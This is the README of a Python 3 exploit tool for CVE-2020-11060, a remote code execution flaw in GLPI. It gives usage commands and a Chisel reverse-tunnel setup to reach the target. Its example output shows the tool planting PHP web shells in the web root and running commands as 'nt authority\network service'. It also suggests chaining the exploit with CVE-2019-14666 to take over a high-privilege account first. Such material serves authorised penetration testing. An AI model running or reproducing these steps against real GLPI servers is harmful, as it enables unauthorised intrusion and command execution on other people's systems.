# CVE-2020-11060

This script is a `python3` module which aims to exploit CVE-2020-11060 in GLPI versions 0.85-9.4.5.

Original implementation: 0xdreadnaught

Python3 refactoring: @n3rada

[My PoC in exploitdb](https://www.exploit-db.com/exploits/49992) is now deprecated since it used `python2`. The original article used behind the scenes is from the Almond team: https://offsec.almond.consulting/playing-with-gzip-rce-in-glpi.html.

## Requirements
- Python 3.x
- Proxychains/Chisel (Optional)

## Usage

### Native

```python
python3 CVE-2020-11060.py --url 'http://<target URL>' --user <'user'> --password <'password'> --platform <win/nix> --offset <#>
```

### Chisel

```
# Kali
chisel server -p 8888 --reverse
# Target
chisel.exe client <kali IP>:8888 R:80:<target IP>:80
# Kali
python3 CVE-2020-11060.py --url 'http://localhost' --user <'user'> --password <'password'> --platform <win/nix> --offset <#>
```

## Example Output

```text
python3 CVE-2020-11060.py --url 'http://glpi.vul.ne' --user 'glpi_adm' --password 'Amvfd6565/432' --platform 'win' --offset 312

[+] GLPI Browser targeting 'http://glpi.vul.ne' ('windows') with following credentials: 'glpi_adm':'Amvfd6565/432'.
[+] Target is up and responding.
[+] User 'glpi_adm' is logged in.
------------------------- trial number 1 -------------------------
[*] Wiping networks...
        Deleting network id: 2413
[+] Network created
[+] Modifying network
        New ESSID: RCEe
[+] Current shellname: bQznfdTr.php
[*] Dumping the database remotely at: C:\xampp\htdocs\sound\bQznfdTr.php
[+] File 'dumped', accessible at: http://glpi.vul.ne/sound/bQznfdTr.php
[+] Shell size: 265
------------------------- trial number 2 -------------------------
[*] Wiping networks...
        Deleting network id: 2414
[+] Network created
[+] Modifying network
        New ESSID: RCEee
[+] Current shellname: HdqrmKtR.php
[*] Dumping the database remotely at: C:\xampp\htdocs\sound\HdqrmKtR.php
[+] File 'dumped', accessible at: http://glpi.vul.ne/sound/HdqrmKtR.php
[+] Shell size: 13882
------------------------- trial number 3 -------------------------
[*] Wiping networks...
        Deleting network id: 2415
[+] Network created
[+] Modifying network
        New ESSID: RCEeee
[+] Current shellname: dwmfIJgN.php
[*] Dumping the database remotely at: C:\xampp\htdocs\sound\dwmfIJgN.php
[+] File 'dumped', accessible at: http://glpi.vul.ne/sound/dwmfIJgN.php
[+] Shell size: 13885
------------------------- trial number 4 -------------------------
[*] Wiping networks...
        Deleting network id: 2416
[+] Network created
[+] Modifying network
        New ESSID: RCEeeee
[+] Current shellname: KmGsYHBw.php
[*] Dumping the database remotely at: C:\xampp\htdocs\sound\KmGsYHBw.php
[+] File 'dumped', accessible at: http://glpi.vul.ne/sound/KmGsYHBw.php
[+] Shell size: 8369
------------------------------------------------------------------
[+] RCE found after 4 trials!
[+] You can execute command remotely as: nt authority\network service@WIN03
[+] Run this tool again with the desired command to inject:
        python3 CVE-2020-11060.py --url 'http://glpi.vul.ne/sound/KmGsYHBw.php' --command 'desired_command_here'
```
After that, you can execute a command freely with:
```python
proxychains -q python3 CVE-2020-11060.py --url 'http://glpi.vul.ne/sound/KmGsYHBw.php' --command 'whoami'
```

And it will return:
```text
[*] Response received from 'http://glpi.vul.ne/sound/KmGsYHBw.php':

nt authority\network service
```

I've chosen to integrate the [poc.txt](https://github.com/AlmondOffSec/PoCs/blob/master/glpi_rce_gzip/poc.txt) directly into the `python3` module to avoid any trouble reaching your github if you use proxychains. 

N.B. The combination with [CVE-2019-14666](https://github.com/blackarrowsec/advisories/tree/master/2019/CVE-2019-14666) is powerful, as you can take control of a high-privilege account before executing it.
